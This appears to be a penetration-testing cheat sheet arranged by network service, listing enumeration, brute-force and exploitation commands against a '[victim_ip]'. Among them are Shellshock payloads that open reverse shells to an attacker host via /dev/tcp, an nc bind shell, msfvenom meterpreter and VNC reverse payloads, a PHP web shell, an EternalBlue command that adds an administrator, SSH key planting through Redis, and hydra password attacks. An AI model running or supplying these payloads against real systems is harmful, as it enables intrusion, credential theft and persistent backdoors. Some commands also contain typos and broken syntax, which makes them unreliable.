- [Amazon_S3](#Amazon_S3)
- [DNS](#DNS)
  - [Interacting with a DNS Server](#Interacting-with-a-DNS_Server)
    - [How to find the A record of а domain](#How-to-find-the-A-record-of-а-domain)
    - [How to check the NS records of a domain](#How-to-check-the-NS-records-of-a-domain)
    - [How to query the SOA record of a domain](#How-to-query-the-SOA-record-of-a-domain)
    - [How to find the MX records of a domain](#How-to-find-the-MX-records-of-a-domain)
    - [How to find all of the available DNS records of a domain.](#How-to-find-all-of-the-available-DNS-records-of-a-domain)
    - [How to check the using of a specific DNS Server](#How-to-check-the-using-of-a-specific-DNS-Server)
    - [How to check the Reverse DNS Lookup](#How-to-check-the-Reverse-DNS-Lookup)
  - [Zone transfer with dig](#Check-Zone-transfer-with-dig )
  - [Automatic scan DNSrecon](#Automatic-scan-DNSrecon)
  - [Automatic scan DNSenum](#Automatic-scan-DNSenum)
- [FTP/TFTP](#FTP/TFTP)
  - [nmap ftp scan](#nmap_ftp_scan)
  - [metasploit tftp](#metasploit_tftp)
  - [Upload_attemps](#Upload_attemps)
  - [FTP path traversal](path_traversal)
  - [Windows dir change](#Windows_dir_change_with_~1)
- [Finger](#Finger)
  - [enumeration script](#enumeration_script)
  - [finger comandline](#finger_comandline)
  - [ssh keygen](#ssh_keygen)
- [HTTP](#HTTP)
  - [Directory scanning](#Directory_scanning)
  - [Subdomain_scanning](#Subdomain_scanning)
  - [Nikto scan](#Nikto_scan)
  - [WhatWeb](#WhatWeb)
  - [Cewl](#Cewl)
  - [nmap](#nmap)
    - [heartbleed](#heartbleed)
    - [vuln](#vuln)
    - [smb](#smb)
    - [shellshock](#shellshock)
- [SQL](#SQL)
  - [sql nmap scan](#sql_nmap_scan)
  - [sql metasploit](#sql_metasploit)
  - [mysql commands](#mysql_commands)
  - [mssql server config file](#mssql_server_config_file)
- [ORACLE](#Oracle)
- [NFS](#NFS)
  - [Basic NFS command](#Basic_command)
  - [Create temp folder](#Create_temp_folder)
  - [mount](#mount)
  - [nmap scan](#nmap_scan)
- [SSH](#SSH)
  - [SSH metasploit enum](#SSH_metasploit_enum)
  - [SSH bruteforce](#SSH_bruteforce)
  - [ssh keygen](#ssh_keygen)
  - [SSH CVE 1](#SSH_CVE_1)
  - [SSH CVE 2](#SSH_CVE_2)
- [RDP](#RDP)
  - [Connect to RPD](connect_RDP)
  - [nmap rdp scan](nmap_rdp_scan])
  - [Bruteforce RDP credentials](#bruteforce_rdp_credentials)
- [RPC](#RPC)
  - [nmap](#nmap)
  - [metasploit scan](#metasploit)
- [SNMP](#SNMP)
  - [SNMP Description](#SNMP_Description)
  - [MIB Tree Description](#MIB_Tree)
  - [snmpwalk](#snmpwalk)
  - [SNMP_CHECK](#SNMP_CHECK)
- [SNMP](#SNMP)
  - [Netcat](#Netcat)
  - [Telnet](#Telent)
  - [Metasploit](#Metasploit)
  - [smtp snum script](#smtp-user-enum)
  - [Nmap](#nmap)
  - [Bruteforce](#Bruteforce)
- [POP3](POP3)
  - [Telnet](#Telnet)
- [SMB](#SMB)
  - [nmap scipt](#nmap)
  - [rpcclient](#rpcclient)
  - [smbmap](#smbmap)
    - [smb_file_upload](#smb_file_upload)
  - [enum4linux](#enum4linux)
  - [eternal blue](#eternal_blue)
    - [nmap script for eternal blue testing](#mmap_script)
    - [metasploit modules for eternal blue testing](#eternal_blue_metasploit)
    - [others tools for eternal blue testing](#tools_for_eternalblue)
  - [msfconsole smb payloads](#msfconsole)
  - [null Session](#null_session)
  - [Hydra bruteforce](#Bruteforce)
  - [SMB perl script](#SMB_perl_script)
- [Redis](#Redis)
- [VNC](#VNC)
  - [VNC nmap scan](#VNC_nmap)
  - [VNC exploit](#VNC_exploit)
  - [MSF VNC auth none](#MSF_VNC_auth_none)
  - [MSF VNC password attack](#MSF_VNC_password_attack)
  - [MSFVenom VNC payload](#MSFVenom_VNC_payload)
  - [VNC post exploitation](#VNC_post_exploitation)
  - [VNC_access](#VNC_access)
- [Webdav](#Webdav)
  - [webdav_scanner](#webdav_scanner)
  - [metasploit](#metasploit)
  - [webdav_via_curl](#webdav_via_curl)
  - [change_extension](#change_extension)
  - [Semicolen_file_extension_bypassing](#Semicolen_file_extension_bypassing)
  - [cadaver_tool](#cadaver_tool)
  - [Use_PUT_method](#Use_PUT_method)
- [MongoDB](#MongoDB)
- [Port knocking](#Port_knocking)
  - [Port knocking configure file](#configure_file)
  - [Port knocking bash script](#bash_script)
  - [Port knocking nmap port knocking](#nmap_port_knocking)
  - [Port knocking hping port knocking](#hping_port_knocking)
- [Shell Shock](#Shellshock)
  - [Shellshock manual_exploitation](#manual_exploitation)
  - [Shellshock SSH exploitaion](#exploitaion_SSH)
  - [Shellshock with nmap script](#nmap_script)
  - [Shellshock_via_smb](#smb)
  - [Shellshock tool](#Shellshock_tool)
- [Apache Tomcat](#Apache-Tomcat)
  - [](TODO)
--------------------------------------------------------------------------------------------------------------------------------
## Amazon_S3

***Bucket is a logical unit of storage in Amazon Web Services (AWS) object storage service, Simple Storage Solution S3. 
Buckets are used to store objects, which consist of data and metadata that describes the data.***

### awscli install
- pip3 install awscli

### aws configue if we have data
- aws configure

### list aws bucket
- aws s3 ls s3://<victim_aws_bucket_name>

***with no creds***
- aws s3 ls s3://<victim_aws_bucket_name> --no-sign-request

### file upload 
- echo "test" >> file.txt
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt 

***with no creds***
- aws s3 cp file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### file remove
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt
  
***with no creds***
- aws s3 rm file.txt s3:<victim_aws_bucket_name>/file.txt  --no-sign-request

### bucket remove
- aws s3 rb file.txt s3:<victim_aws_bucket_name>

***with no creds***
- aws s3 rb file.txt s3:<victim_aws_bucket_name>  --no-sign-request

### bucket list recursive
- aws s3 cp s3://<victim_aws_bucket_name> . --recursive

***with no creds***
- aws s3 cp s3://<victim_aws_bucket_name> . --recursive --no-sign-request

--------------------------------------------------------------------------------------------------------------------------------
# DNS

## Interacting with a DNS Server
```
- host -t ns [victim_domain]
- host -t mx [victim_domain]
```

### How to find the A record of а domain
You can see how many A records are there and see the IP Addresses of each one. 
```
nslookup [victim_address]
```
### How to check the NS records of a domain
You can see which is the authoritative server for a specific domain
```
nslookup -type=ns [victim_address]
```
### How to query the SOA record of a domain
You can see the start of authority and get information about the zone. 
```
nslookup -type=soa 
```
### How to find the MX records of a domain
You can see if all the mail servers are working well. 
```
nslookup -query=mx [victim_address]
```
### How to find all of the available DNS records of a domain
You can see all the available DNS records.
```
nslookup -type=any [victim_address]
```

### How to check the using of a specific DNS Server
You can review a particular DNS server.
```
nslookup example.com [ns1.victim_address]
```
### How to check the Reverse DNS Lookup
How verify if an IP address is related to a specific domain
```
nslookup 10.20.30.40
```
```
nslookup
  SERVER [victim_ip]
  [victim_ip]
````

## Check Zone transfer with dig 
```
dig axfr [victim_servername] @victim-ip
```

## Automatic scan DNSrecon
```
dnsrecon -d [victim_scan] -t axfr
```

##  Automatic scan DNSenum
```
dnsenum [victim_scan]
```

### Zone_transfer_description
Zone file is a file on server contains entries for different Resource Records(RR). These records can provide us a bunch of information about the domain. Each zone file must start with a Start of Authority (SOA) record containing an authoritative nameserver for the domain (for e.g. ns1.google.com for google.com ) and an email address of someone responsible for the management of the nameserver.
Types of Resource Records:
NS Recors: use the given authoritative nameserver
MX Recors: tells us which server is responsible for receiving mails sent to that domain name
TXT Records: consists of arbitrarily human readable text in a record
CNAME Records: Gives an alias of one name to another.
A Records: Give us IP-address for a particular domain

--------------------------------------------------------------------------------------------------------------------------------
# FTP/TFTP

### nmap_ftp_scan:
- nmap -p 21 -sV [victim_ip]
- nmap -sV -sC [victim_ip] -p 21
- namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
- nmap –top-ports 1000 -vv -Pn -b anonymous:password@[victim_ip:21] 127.0.0.1
- nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
- nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]

### metasploit_tftp
```
use auxiliary/scanner/tftp/tftpbrute
```
### Upload_attemps
```
ftp> put shell.php shell.jpg
ftp> PUT shell.php shell.jpg
ftp> send 
  (local-file) shell.php
  (remote-file) shell.jpg
```
### path_traversal
```
dir ../
ls ../
```

### Windows_dir_change_with_~1
```
cd /Docume~1/
cd /Progra~1/
```
--------------------------------------------------------------------------------------------------------------------------------
# Finger

### enumeration_script
- https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl

### finger_comandline 
```
finger [username]@[ip]

finger "|/bin/ls -a /@[victim_ip]"
```
--------------------------------------------------------------------------------------------------------------------------------
# HTTP 

## Directory_scanning
- dir mode
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
- dns mode
  - gobuster dns -d 10.11.1.x -w ~/wordlists/subdomains.txt
  - gobuster dns -d google.com -w ~/wordlists/subdomains.txt -i (with ip)
- extension usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -x .php, .txt, .html
- string usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -s "200"
- expanded usage(show full url)
  - gobuster -e dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
- useragent usage
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -a CustomAgent
- export options
  - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt -o output.txt
- proxy chain
  -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt

## Subdomain_scanning

## Nikto_scan
nikto -h [victim_ip]
nikto -Display V -h [victim_ip]
nikto -Display V -o results.html -Format htm -h [victim_ip]
```
0 – File Upload
1 – Interesting File / Seen in logs
2 – Misconfiguration / Default File
3 – Information Disclosure
4 – Injection (XSS/Script/HTML)
5 – Remote File Retrieval – Inside Web Root
6 – Denial of Service
7 – Remote File Retrieval – Server Wide
8 – Command Execution / Remote Shell
9 – SQL Injection
a – Authentication Bypass
b – Software Identification
c – Remote Source Inclusion
x – Reverse Tuning Options (i.e., include all except specified)

example: nikto -Tuning 9 -h [victim_ip]6
```
## Everything except number 6 - DOS
```
nikto -Tuning x 6 -h [victim_ip]
```
## WhatWeb
**Another enum type tool like nikto but looks to be more advanced and prettier in output**
```
whatweb -v -a 4 http://[victim_ip]
```

## Cewl
```
create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
```

## nmap

### nmap_port_scan
```
nmap -p- --min-rate 10000 [victim_ip]
```

### heartbleed
```
nmap -p [victim_port] --script ssl-heartbleed [victim_ip]
```

### vuln
```
nmap -p [victim_port] --script vuln [victim_ip]
```
--------------------------------------------------------------------------------------------------------------------------------
## SQL

## sql_nmap_scan 
- nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
- nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
- nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306

## sql_metasploit
```
  msf > use auxiliary/scanner/mssql/mssql_ping
  msf> use auxiliary/scanner/mssql/mssql_login
  msf> use exploit/windows/mssql/mssql_payload
  set PAYLOAD windows/meterpreter/reverse_tcp

Gain shell using gathered credentials
  msf > use exploit/windows/mssql/mssql_payload
  msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
```

## mysql_commands
```
mysql> select do_system('id');
mysql> \! sh
```

#### mssql_erver_config_file
```
cat freetds.conf

host = $ip
port = 1433
tds version = 8.0
user=sa

root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
```
## mysqldump

binary: mysqldump
```
mysqldump --user=<user_name> --password=<user_password> --host=localhost <database name>

for example:
mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
```
-------------------------------------------------------------------------------------------------------------------------------
# Oracle

## Service on port 1521 
 
- Usefull tool set
- https://www.oracle.com/pl/database/technologies/instant-client/winx64-64-downloads.html
--------------------------------------------------------------------------------------------------------------------------------------------------------------
## Identify SIDs

Identify SIDs via odat.py tool
```
apt-get install odat
odat sidguesser -s <victim_ip>
```

Valid SID brute forcing via metasploit
```
msf > use auxiliary/admin/oracle/sid_brute 
msf auxiliary(admin/oracle/sid_brute) > set rhost <victim_ip>
msf auxiliary(admin/oracle/sid_brute) > run
```

## Brute force credentials 

Brute force credentials via metasploit
```
msf > use auxiliary/admin/oracle/oracle_login
msf auxiliary(admin/oracle/oracle_login) > set sid (for example XE)
msf auxiliary(admin/oracle/oracle_login) > set rhost <victim_ip>
msf auxiliary(admin/oracle/oracle_login) > run
```
Get credentials with other way
#TODO!

## Check options with odat
```
odat all -s <victim_ip> -d XE -U scott -P tiger --sysdba
```
**For exmaple search DBMS_XSLPROCESSOR library(this options allows us to put any files onto the machine**

## PUT aspx file in the machine

Generate payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<my_port> -f aspx > rs_file.aspx
```

PUT payload
```
odat dbmsxslprocessor -s <victim_ip> -d XE -U scott -P tiger --putFile "C://inetpub//wwwroot//" t.aspx /full/path/for/local/aspx/file --sysdba

C://inetpub//wwwroot// : victim path, example for this case
t.aspx: example shell name
XE: example SIDs
```
## Port 2100
```
credentials:
sys:sys
scott:tiger
```
--------------------------------------------------------------------------------------------------------------------------------------
# NFS
- The Network File System (NFS) is a client/server application that lets a computer user view and optionally store and update files on a remote computer as though they were on the user's own computer. The NFS protocol is one of several distributed file system standards for network-attached storage (NAS).


## Basic_command
- showmount [ip]

## Create_temp_folder
```
mkdir /tmp/nfs
```
## mount
```
mount -t nfs [ip]:/home/vulnix /tmp/nfs -nolock
```

## nmap_scan 
```
nmap -sV --script=nfs-showmount [victim_ip]
```
--------------------------------------------------------------------------------------------------------------------------------------
# SSH 

## SSH_metasploit_enum
```
use auxiliary/scanner/ssh/ssh_enumusers
set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
run
```
## SSH_bruteforce
```
hydra -v -V -l root -P password-file.txt [victim_ip] ssh
hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
```
## ssh_keygen
```
ssh-keygen
mkdir /mnt/user_name/.ssh
touch /mnt/user_name/.ssh/authorized_keys
cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
ssh use_name@[victim_ip
```

## SSH_CVE_1
- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py

## SSH_CVE_2
- https://github.com/g0tmi1k/debian-ssh
--------------------------------------------------------------------------------------------------------------------------------------
# RDP

## connect_RDP
```
rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
```

## nmap_rdp_scan
```
nmap -p 3389 --script rdp-ntlm-info [victim_ip]
```

## bruteforce_rdp_credentials
```
hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
```
--------------------------------------------------------------------------------------------------------------------------------------
# rpc
```
rpcinfo -p [victim_ip]
```

## nmap
```
nmap [vitim_ip] --script msrpc-enum
```

## metasploit
```
msf> use exploit/windows/dcerpc/ms03_026_dcom
```
--------------------------------------------------------------------------------------------------------------------------------------
# SNMP

## SNMP_Description

SNMP is based on UDP, a simple, stateless protocol, and therefore susceptible to IP spoofing and replay attacks. SNMP information and credentials can be easily intercepted over a local network.

## MIB_Tree

SNMP Managment Information Base (MIB) is a database contains info related to network management. 

## nmap
```
nmap -sU --open -p 161, [victim_ip] 
```

## snmpwalk
- snmpwalk -c public [victim_ip] -v1
- snmpwalk -c private [victim_ip] -v1
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
- snmpset -v 1 -c public [victim_ip] .1.3.6.1.2.1.1.5 s HACKED
- snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'

## SNMP-CHECK
- snmp-check -c public 10.11.1.x

-------------------------------------------------------------------------------------------------------------------------------------
# SMTP

## Netcat
```
nc -nv [victim_ip] [smtp_port]
```
- VRFY root
- VRFY [some_user_name]
***VRFY***: verify an email address
***EXPN***: asks the server for the membership of mailing list

## Telnet
```
telnet <victim_ip> <port>

telnet <victim_ip> <port>
>EHLO root
>DATA
>QUIT
```
## Metasploit
```
auxiliary/scanner/smtp/smtp_enum
```
## smtp-user-enum
```
perl smtp-user-enum -M VRFY -U user.txt -t <victim_ip
```
dictionary
 - /usr/share/wordlists/metasploit/unix_users.txt
 - /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt

## nmap
```
nmap –script smtp-enum-users.nse <victim_ip>
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [victim_ip]
```

## Bruteforce
```
hydra -P /usr/share/wordlistsnmap.lst [victim_ip] smtp -V
```
-------------------------------------------------------------------------------------------------------------------------------------
# POP3

## Telnet
```
telnet [victim_ip] [pop3_port]
> USER username
> PASS userpass
> RETR 1 or 2.. etc
```
- dictionary: /usr/share/wordlist/fasttrack.txt
-------------------------------------------------------------------------------------------------------------------------------------
# SMB
  It's protocol for sharing files and resources. Runs on port 445 or on port 139
  
## smb_nmap

- nmap -v -p 139,445 --script=smb-os-discovery [victim_ip]
- nmap -v -sSVC -p 139,445 --script discovery [victim_ip]
- nmap --script smb-enum-shares -p 139,445 [victim_ip]
- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse [victim_ip]
- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse [victim_ip]
- nmap -sV -p 139,445 --script=smb-vuln-* --script-args=unsafe=1 [victim_ip]

## rpcclient
- rpcclient -U "" -N [victim_ip]
```
  -U "" - null session
  -N - no password
```
## NetBIOS_Service
- nbtscan -r [victim_ip]

## smbmap
  - smbmap -H <victim_ip>
  - smbmap -H <victim_ip> -R
  - smbmap -H <victim_ip> -u anonymous -d <directory>
  
  ***H***: hostname
  ***R***: recursive, go through each directory and oyt the files
  ***U***: username
  
## smbclinet
```
  - smbclient \\\\[victim_ip]\\[sharename]
  - smbclient -N -L \\\\\[victim_ip]
  - smbclient -N -L //[victim_ip]/directory
  - smbclient //[victim_ip]/"[victim_folder]" -m NT1 --option="client min protocol=NT1"
 ```

### smbclinet_file_upload
```
smbclient -N //<victim_ip>/<folder> -c 'put cmd.php cmd.php'
```
 
## enum4linux
  - Share Enumeration:
    - enum4linux-S [victim_ip]
  - Usernames Enumeration:
    - enum4linux -U -P [victim_ip]
  - All Enumeration:  
    - enum4linux -a [victim_ip]
  - enum4linux -a  [victim_ip]
  - enum4linux -u 'guest' -p '' -a  [victim_ip]
  
## eternalblue

### mmap_script:
```
nmap -v --script vuln [victim_ip] -p 445,139
nmap -sV -script smb-vuln-ms17-010.nse [victim_ip] -p 139,44
```

### eternal_blue_metasploit
```
example one:
use auxiliary/admin/smb/ms17_010_command
set rhosts: [victim_ip]
set rport: 445
set command: net user test test123! /add
run
set command: net localgroup administrators tester /add
run

example two:
use exploit/windows/smb/ms17_010_psexec
set rhosts [victim_ip]
run
```

### tools_for_eternalblue
- https://github.com/worawit/MS17-010
- https://github.com/3ndG4me/AutoBlue-MS17-010
- https://github.com/sailay1996/eternal-pulsar
- https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a
- https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/
    
## msfconsole
  - set rhosts 192.168.55.248
  - use auxiliary/scanner/smb/smb_enumusers
    - run
  - use auxiliary/scanner/smb/smb_enumshares
    - run
  - use auxiliary/scanner/smb/smb_version

## null_session
- null session and extract information
- nbtscan -r [victim_ip]

## Bruteforce
- hydra -l administrator -P /usr/share/wordlists/rockyou.txt -t 1 [victim_ip] smb

## Smb_version_checker 
```
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

## SMB_perl_script
- https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/7.pl

-------------------------------------------------------------------------------------------------------------------------------------
# Redis:
Data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams

#### nmap

#### telnet
```
telnet <victim_ip> <redis_port_usually_6379>
```

#### nc
```
nc <victim_ip> <redis_port_usually_6379>
```

#### Generate SSH key
```
ssh-keygen -t rsa b 4096 -C <youremail>@<email_domain>
```

### Add random data before and after our key:
```
- (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
```

### Connect to redis 
```
apt-get install redis-tools
redis-cli -h <victim_ip>
````

### Flush keys\
```
redis-cli -h <victim_ip> -p 6379 flushall
```

### Set our keys into the database
```
cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb
```

### Check the current folder 
```
>config get dir
```

### Change out directory
```
> config set dir /<victim_user_name>/.ssh/
for examople: config set dir /var/lib/redis/.ssh/
```

### Change name of our file
```
> set dbfilename "authorized_keys"
```

### Save changes
```
> save
```
### Try to login into server via SSH
```
chmod 600 id_rsa
ssh -i id_rsa redis@<victim_ip>
```
-------------------------------------------------------------------------------------------------------------------------------------
# VNC
Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 

## VNC_nmap
```
nmap -sV --script realvnc-auth-bypass.nse [victim_ip] -p 5900

nmap --script vnc-info [victim_ip] -p 5901
```
## VNC_exploit
```
https://www.exploit-db.com/exploits/36932
```
## MSF_VNC_auth_none
```
  msf > use auxiliary/scanner/vnc/vnc_none_auth
  msf > set RHOSTS [target_ip]
  msf > set THREADS [int]
  msf > run
```

## MSF_VNC_password_attack
```
  msf > use auxiliary/scanner/vnc/vnc_login
  msf > set rhosts [victim_ip]
  msf > set rport [victim_ip
  msf > set pass_file /your/dictionary/file
  msf > run
```

## MSFVenom_VNC_payload
```
msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe

  msf > use exploit/multi/handler
  msf > set payload/widnows/vncinject/reverse_tcp 
  msf > set lport [your_ip]
  msf > set lport [your_port]
  msf > set viewonly false
  msf > run
```

## VNC_post_exploitation
```
meterpreter > run vnc
```

## VNC_access
```
sudo apt install tigervnc-viewer
vncviewer [victim_ip]:[victim_port]
```
-------------------------------------------------------------------------------------------------------------------------------------
# Webdav

## webdav_scanner
```
davtest-url [victim_url]
davtest -move -senddb auto -url http://[victim_ip]:[victim_port]
```
## metasploit
```
  use auxiliary/scanner/http/webdav_scanner
  use auxiliary/scanner/http/webdav_internal_ip
  use auxiliary/scanner/http/webdav_website_content
```
## webdav_via_curl
```
echo xyz > test.txt
curl -X PUT http://[victim_ip]/test.txt -d @test.txt
curl https://[victim_ip]/test.txt
```
## change_extension 
```
curl -X MOVE -H 'Destination http://[victim_ip/test.php] http://[victim_ip]/test.txt
```
## Semicolen_file_extension_bypassing
```
upload file as file.asp;.jpg
```
## cadaver_tool
```
cadaver http://[victim_ip]/path/
  - dav:/path/> put file.txt
  - dav:/path/> move file.txt file.asp;.txt
```  
## Use_PUT_method
```
use burp
PUT /test/shell.php

<?php system($_GET["cmd"])?>
```
-------------------------------------------------------------------------------------------------------------------------------------
# Port_knocking

## configure_file
```
/etc/knocked.conf
**squence** value its sequence of ports someone must access to open or close port.
```
## bash_script
```
for i in 7 2350 43;
  do nmap -Pn -p $i --host-timeout 201 --max-retries 0 [victim_ip]; 
done
```
## nmap_port_knocking
```
nmap -Pn -p $i --host-timeout 100 --max-retries 0 [victim_ip]; 
```
## hping_port_knocking
```
hping3 -S [victim_ip] -p 1 -c 1
```
-------------------------------------------------------------------------------------------------------------------------------------
# Shellshock

## manual_exploitation

- echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc [victim_ip] 80

- curl -x TARGETADDRESS -H "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/HOSTIP/1234 0>&1" [victim_ip]/cgi-bin/status

- curl http://[victim_ip]/path/to/cgi- bin/name_of_vuln_cgi -H "custom:() { ignored; }; /bin/bash -i >& /dev/tcp/[LHOST]/[LPORT] 0>&1 "

- curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[your_ip]/[your_port] 0>&1' http://[victim_ip]/cgi-bin/test.sh


## exploitaion_SSH
```
ssh username@$[victim_ip] '() { :;}; /bin/bash'
```
## nmap_script
```
nmap --script -p [victim_port] http-shellshock --script-args uri=[/vuln/path] cmd=[yours_command] [victim_ip]
```
## smb
```
#TODO
```

## Shellshock_tool
***shocker***: https://github.com/nccgroup/shocker

shocker sample:
``` 
python shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H [victim_ip]  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose
```

